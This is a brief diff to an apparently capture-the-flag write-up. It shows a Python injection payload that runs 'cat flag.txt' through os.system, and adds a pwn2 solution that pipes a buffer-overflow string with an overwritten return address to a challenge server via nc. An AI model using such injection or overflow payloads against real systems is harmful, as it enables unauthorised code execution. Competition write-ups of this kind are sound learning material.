@@ -7,3 +7,4 @@
 4. Use python code to open flag.txt file such as: `__import__('os').system("cat flag.txt")`
 
 ## pwn2
+`python2 -c 'print "\x41" * 32 + "\x8b\x98\x04\x08"' | nc pwn2.ihack.sibersiaga.my 1389`
